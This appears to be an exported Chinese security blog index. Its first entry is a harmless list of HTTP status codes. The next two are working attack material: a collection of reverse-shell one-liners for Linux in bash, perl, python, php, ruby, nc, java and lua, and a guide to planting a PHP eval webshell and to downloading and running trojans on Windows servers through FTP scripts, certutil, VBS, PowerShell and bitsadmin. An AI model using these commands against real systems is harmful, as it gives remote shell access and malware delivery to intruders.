<h3 id="3-重定向类-：为了完成指定的动作，必须接受进一步处理"><a href="#3-重定向类-：为了完成指定的动作，必须接受进一步处理" class="headerlink" title="3**(重定向类)：为了完成指定的动作，必须接受进一步处理"></a>3**(重定向类)：为了完成指定的动作，必须接受进一步处理</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">300——请求的资源可在多处得到</span><br><span class="line">301——本网页被永久性转移到另一个URL</span><br><span class="line">302——请求的网页被转移到一个新的地址，但客户访问仍继续通过原始URL地址，重定向，新的URL会在response中的Location中返回，浏览器将会使用新的URL发出新的Request。</span><br><span class="line">303——建议客户访问其他URL或访问方式</span><br><span class="line">304——自从上次请求后，请求的网页未修改过，服务器返回此响应时，不会返回网页内容，代表上次的文档已经被缓存了，还可以继续使用</span><br><span class="line">305——请求的资源必须从服务器指定的地址得到</span><br><span class="line">306——前一版本HTTP中使用的代码，现行版本中不再使用</span><br><span class="line">307——申明请求的资源临时性删除</span><br></pre></td></tr></table></figure>

<h3 id="4-客户端错误类-：请求包含错误语法或不能正确执行"><a href="#4-客户端错误类-：请求包含错误语法或不能正确执行" class="headerlink" title="4**(客户端错误类)：请求包含错误语法或不能正确执行"></a>4**(客户端错误类)：请求包含错误语法或不能正确执行</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">400——客户端请求有语法错误，不能被服务器所理解</span><br><span class="line">401——请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用</span><br><span class="line">HTTP 401.2 - 未授权：服务器配置问题导致登录失败</span><br><span class="line">HTTP 401.3 - ACL 禁止访问资源</span><br><span class="line">HTTP 401.4 - 未授权：授权被筛选器拒绝</span><br><span class="line">HTTP 401.5 - 未授权：ISAPI 或 CGI 授权失败</span><br><span class="line">402——保留有效ChargeTo头响应</span><br><span class="line">403——禁止访问，服务器收到请求，但是拒绝提供服务</span><br><span class="line">HTTP 403.1 禁止访问：禁止可执行访问</span><br><span class="line">HTTP 403.2 - 禁止访问：禁止读访问</span><br><span class="line">HTTP 403.3 - 禁止访问：禁止写访问</span><br><span class="line">HTTP 403.4 - 禁止访问：要求 SSL</span><br><span class="line">HTTP 403.5 - 禁止访问：要求 SSL 128</span><br><span class="line">HTTP 403.6 - 禁止访问：IP 地址被拒绝</span><br><span class="line">HTTP 403.7 - 禁止访问：要求客户证书</span><br><span class="line">HTTP 403.8 - 禁止访问：禁止站点访问</span><br><span class="line">HTTP 403.9 - 禁止访问：连接的用户过多</span><br><span class="line">HTTP 403.10 - 禁止访问：配置无效</span><br><span class="line">HTTP 403.11 - 禁止访问：密码更改</span><br><span class="line">HTTP 403.12 - 禁止访问：映射器拒绝访问</span><br><span class="line">HTTP 403.13 - 禁止访问：客户证书已被吊销</span><br><span class="line">HTTP 403.15 - 禁止访问：客户访问许可过多</span><br><span class="line">HTTP 403.16 - 禁止访问：客户证书不可信或者无效</span><br><span class="line">HTTP 403.17 - 禁止访问：客户证书已经到期或者尚未生效</span><br><span class="line">404——一个404错误表明可连接服务器，但服务器无法取得所请求的网页，请求资源不存在。eg：输入了错误的URL</span><br><span class="line">405——用户在Request-Line字段定义的方法不允许</span><br><span class="line">406——根据用户发送的Accept拖，请求资源不可访问</span><br><span class="line">407——类似401，用户必须首先在代理服务器上得到授权</span><br><span class="line">408——客户端没有在用户指定的饿时间内完成请求</span><br><span class="line">409——对当前资源状态，请求不能完成</span><br><span class="line">410——服务器上不再有此资源且无进一步的参考地址</span><br><span class="line">411——服务器拒绝用户定义的Content-Length属性请求</span><br><span class="line">412——一个或多个请求头字段在当前请求中错误</span><br><span class="line">413——请求的资源大于服务器允许的大小</span><br><span class="line">414——请求的资源URL长于服务器允许的长度</span><br><span class="line">415——请求资源不支持请求项目格式</span><br><span class="line">416——请求中包含Range请求头字段，在当前请求资源范围内没有range指示值，请求也不包含If-Range请求头字段</span><br><span class="line">417——服务器不满足请求Expect头字段指定的期望值，如果是代理服务器，可能是下一级服务器不能满足请求长。</span><br></pre></td></tr></table></figure>
<h3 id="5-服务端错误类-：服务器不能正确执行一个正确的请求"><a href="#5-服务端错误类-：服务器不能正确执行一个正确的请求" class="headerlink" title="5**(服务端错误类)：服务器不能正确执行一个正确的请求"></a>5**(服务端错误类)：服务器不能正确执行一个正确的请求</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP 500 - 服务器遇到错误，无法完成请求</span><br><span class="line">HTTP 500.100 - 内部服务器错误 - ASP 错误</span><br><span class="line">HTTP 500-11 服务器关闭</span><br><span class="line">HTTP 500-12 应用程序重新启动</span><br><span class="line">HTTP 500-13 - 服务器太忙</span><br><span class="line">HTTP 500-14 - 应用程序无效</span><br><span class="line">HTTP 500-15 - 不允许请求 global.asa</span><br><span class="line">Error 501 - 未实现（Web 服务器不理解或不支持它在客户端发送给它的 HTTP 数据流中找到的 HTTP 方法。）</span><br><span class="line">HTTP 502 - 网关错误HTTP 503：由于超载或停机维护，服务器目前无法使用，一段时间后可能恢复正常</span><br></pre></td></tr></table></figure>








]]></content>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux下反弹shell方法汇总</title>
    <url>/2018/04/13/Linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h4 id="bash版本："><a href="#bash版本：" class="headerlink" title="bash版本："></a>bash版本：</h4><a id="more"></a><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>注意这个是由解析shell的bash完成，所以某些情况下不支持</p>
<h4 id="perl版本"><a href="#perl版本" class="headerlink" title="perl版本:"></a>perl版本:</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.0.0.1&quot;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure>

<h4 id="python版本："><a href="#python版本：" class="headerlink" title="python版本："></a>python版本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &apos;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&apos;</span><br></pre></td></tr></table></figure>

<h4 id="php版本："><a href="#php版本：" class="headerlink" title="php版本："></a>php版本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php -r &apos;$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&apos;</span><br></pre></td></tr></table></figure>

<h4 id="ruby版本："><a href="#ruby版本：" class="headerlink" title="ruby版本："></a>ruby版本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ruby -rsocket -e&apos;f=TCPSocket.open(&quot;10.0.0.1&quot;,1234).to_i;exec sprintf(&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;,f,f,f)&apos;</span><br></pre></td></tr></table></figure>

<h4 id="nc版本："><a href="#nc版本：" class="headerlink" title="nc版本："></a>nc版本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -e /bin/sh 10.0.0.1 1234</span><br><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</span><br><span class="line">nc x.x.x.x 8888|/bin/sh|nc x.x.x.x 9999</span><br></pre></td></tr></table></figure>

<h4 id="java版本："><a href="#java版本：" class="headerlink" title="java版本："></a>java版本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>

<h4 id="lua版本："><a href="#lua版本：" class="headerlink" title="lua版本："></a>lua版本：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lua -e &quot;require(&apos;socket&apos;);require(&apos;os&apos;);t=socket.tcp();t:connect(&apos;10.0.0.1&apos;,&apos;1234&apos;);os.execute(&apos;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&apos;);&quot;</span><br></pre></td></tr></table></figure>

<h4 id="nc不使用-e："><a href="#nc不使用-e：" class="headerlink" title="nc不使用-e："></a>nc不使用-e：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hacker:nc -lvnp listenport</span><br><span class="line">Victim:mknod /tmp/backpipe p</span><br><span class="line">Victim:/bin/sh 0&lt;/tmp/backpipe | nc attackerip listenport 1&gt;/tmp/backpipe</span><br></pre></td></tr></table></figure>
<h4 id="不使用nc"><a href="#不使用nc" class="headerlink" title="不使用nc"></a>不使用nc</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Method 1:</span><br><span class="line">Hacker: nc -nvlpp 8080</span><br><span class="line">Victim: /bin/bash -i &gt; /dev/tcp/173.214.173.151/8080 0&lt;&amp;1 2&gt;&amp;1</span><br><span class="line">Method 2:</span><br><span class="line">Hacker: nc -nvlpp8080</span><br><span class="line">Victim: mknod backpipe p &amp;&amp; telnet 173.214.173.151 8080 0backpipe</span><br><span class="line">Method 3:</span><br><span class="line">Hacker: nc -nvlpp8080</span><br><span class="line">Hacker: nc -nvlpp8888</span><br><span class="line">Victim: telnet 173.214.173.151 8080 | /bin/bash | telnet 173.214.173.151 8888</span><br></pre></td></tr></table></figure>







]]></content>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
  <entry>
    <title>在windows上免杀传马</title>
    <url>/2018/04/13/%E5%9C%A8windows%E4%B8%8A%E5%85%8D%E6%9D%80%E4%BC%A0%E9%A9%AC/</url>
    <content><![CDATA[<p>本文所写的是当服务器只有命令执行时，如果通过命令执行去上传木马或者webshell文件的方法总结：</p><a id="more"></a>
<h3 id="一：一句话"><a href="#一：一句话" class="headerlink" title="一：一句话"></a>一：一句话</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo ^&lt;^?php @eval($_POST[1])?^&gt;^ &gt; C:\www\</span><br></pre></td></tr></table></figure>
<p>通过echo命令将一句话木马输出到C盘www目录</p>
<p>注：我们可以看到一句话木马的两边大于小于号被加上了^符号，那是应为DOS下此类符号是存在具体意义的，并不是单纯的字符，所以我们需要将其转义。这个方法是我自己找的，上传了一句话，自己菜刀连就好了。</p>
<h3 id="二：FTP"><a href="#二：FTP" class="headerlink" title="二：FTP"></a>二：FTP</h3><p>自己在公网上弄个FTP服务器，将pt.exe木马文件传上去</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo open 1.1.1.1&gt;pt.txt&amp;echo anonymous&gt;&gt;pt.txt&amp;echo whatever&gt;&gt;pt.txt&amp;echo binary&gt;&gt;pt.txt&amp;echo lcd c:\&gt;&gt;echo get pt.exe&gt;&gt;pt.txt&amp;echo bye&gt;&gt;pt.txt&amp;ftp -s:pt.txt</span><br></pre></td></tr></table></figure>
<p>注：这是将所有命令合并成为一条命令了，会的人，都看的懂是啥意思。在这里就只解释一下pt.exe和pt.txt的区别：</p>
<p>pt.exe是你的反弹木马程序，而pt.txt是一个文本文件，这个文本文件中保存了你这一长条命令的结果。</p>
<p>而这一长条命令中最后的一句命令ftp -s:pt.txt的意思是：让ftp程序去执行pt.txt文件。懂我什么意思了吧？<br>下面是pt.txt文件长得样子</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">open 1.1.1.1</span><br><span class="line">anonymous</span><br><span class="line">whatever</span><br><span class="line">binary</span><br><span class="line">lcd c:\</span><br><span class="line">get pt.exe</span><br><span class="line">bye</span><br></pre></td></tr></table></figure>
<p>这命令执行完之后，木马是下载下来了，但是执行还是要手动执行的。注注：“lcd c:\”的意思是指定下载的文件位置，有的时候有文件夹权限问题，需要指定路径，可选项</p>
<h3 id="三：certutil"><a href="#三：certutil" class="headerlink" title="三：certutil"></a>三：certutil</h3><p>使用certutil反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cmd.exe /c &quot;certutil.exe -urlcache -split -f http://1.1.1.1/test.exe &amp;test.exe &amp;del test.exe&quot;</span><br></pre></td></tr></table></figure>

<p>我来解释一下这个命令是什么意思<br>让cmd去叫certutil这个证书管理程序下载<a href="http://1.1.1.1/这个网站下的test.exe并且执行这个test.exe文件，然后删掉test.exe文件。" target="_blank" rel="noopener">http://1.1.1.1/这个网站下的test.exe并且执行这个test.exe文件，然后删掉test.exe文件。</a></p>
<hr>
<p>2018年9月4号更新：<br>服务器禁止上传文件，那我们也可以用以下方法将文件下载到服务器</p>
<h3 id="vbs下载文件"><a href="#vbs下载文件" class="headerlink" title="vbs下载文件"></a>vbs下载文件</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Set Post = CreateObject(&quot;Msxml2.XMLHTTP&quot;)</span><br><span class="line">Set Shell = CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">Post.Open &quot;GET&quot;,&quot;http://233.233.233.233/2333.exe&quot;,0</span><br><span class="line">Post.Send()</span><br><span class="line">Set aGet = CreateObject(&quot;ADODB.Stream&quot;)</span><br><span class="line">aGet.Mode = 3</span><br><span class="line">aGet.Type = 1</span><br><span class="line">aGet.Open()</span><br><span class="line">aGet.Write(Post.responseBody)</span><br><span class="line">aGet.SaveToFile &quot;C:\2333.exe&quot;,2</span><br></pre></td></tr></table></figure>
<h3 id="powershell下载"><a href="#powershell下载" class="headerlink" title="powershell下载"></a>powershell下载</h3><p>注意：内核5.2以下版本可能无效</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">powershell(new-object System.Net.WebClient).DownloadFile( &apos;http://233.233.233.233/2333.exe&apos;,&apos;C:\2333.exe&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="bitsadmin下载"><a href="#bitsadmin下载" class="headerlink" title="bitsadmin下载"></a>bitsadmin下载</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bitsadmin /transfer n http://233.233.233.233/2333.exe  C:\2333.exe</span><br></pre></td></tr></table></figure>
<p>注意：不支持https、ftp协议，使用kali的simplehttpserver作服务器会报错</p>
]]></content>
      <tags>
        <tag>资料</tag>
      </tags>
  </entry>
</search>
